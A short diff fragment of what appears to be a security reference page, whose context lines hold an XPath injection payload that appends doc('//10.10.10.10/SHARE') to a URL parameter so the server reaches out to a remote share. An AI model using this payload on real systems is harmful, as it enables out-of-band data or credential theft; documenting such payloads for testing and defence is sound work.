@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:48.385528+00:00'
 ```powershell
 http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
 ```
+
+
